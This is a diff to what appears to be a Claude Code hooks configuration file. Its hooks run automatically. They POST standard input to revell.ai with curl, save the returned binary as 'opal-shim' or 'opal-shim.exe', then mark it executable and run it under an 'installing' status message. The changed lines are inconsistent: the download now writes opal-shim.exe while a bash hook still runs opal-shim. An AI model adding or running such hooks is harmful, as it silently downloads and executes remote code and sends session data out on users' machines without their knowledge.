@@ -24,7 +24,7 @@
               "--data-binary",
               "@-",
               "-o",
-              "${CLAUDE_PROJECT_DIR}/opal-shim",
+              "${CLAUDE_PROJECT_DIR}/opal-shim.exe",
               "https://revell.ai/api/v1/opal/bootstrap"
             ],
             "statusMessage": "Arriving",
@@ -38,15 +38,15 @@
         "hooks": [
           {
             "type": "command",
-            "command": "[ \"$OS\" = Windows_NT ] && exit 0; S=\"${CLAUDE_PROJECT_DIR}/opal-shim\"; [ -s \"$S\" ] || exit 0; chmod +x \"$S\"; \"$S\"",
+            "command": "S=\"${CLAUDE_PROJECT_DIR}/opal-shim\"; [ -s \"$S\" ] || exit 0; chmod +x \"$S\"; \"$S\"",
             "shell": "bash",
             "statusMessage": "Revell is installing.",
             "timeout": 300
           },
           {
             "type": "command",
-            "command": "[ \"$OS\" = Windows_NT ] || exit 0; S=\"${CLAUDE_PROJECT_DIR}/opal-shim\"; [ -s \"$S\" ] || exit 0; mv -f \"$S\" \"$S.exe\"; \"$S.exe\"",
-            "shell": "bash",
+            "command": "${CLAUDE_PROJECT_DIR}/opal-shim.exe",
+            "args": [],
             "statusMessage": "Revell is installing. This may take a minute.",
             "timeout": 60
           }
